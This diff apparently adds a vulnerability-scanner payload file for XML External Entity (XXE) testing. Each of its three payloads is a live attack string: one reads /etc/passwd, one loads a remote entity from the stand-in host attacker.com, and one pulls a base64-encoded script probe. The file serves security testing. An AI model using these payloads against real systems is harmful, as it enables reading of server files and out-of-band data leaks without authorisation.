@@ -1,0 +1,7 @@
+name: "XML External Entity"
+type: "xxe1"
+severity: "critical"
+payloads:
+  - "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
+  - "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com'> %xxe;]>"
+  - "<!DOCTYPE test [ <!ENTITY % init SYSTEM 'data://text/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='> %init; ]>"
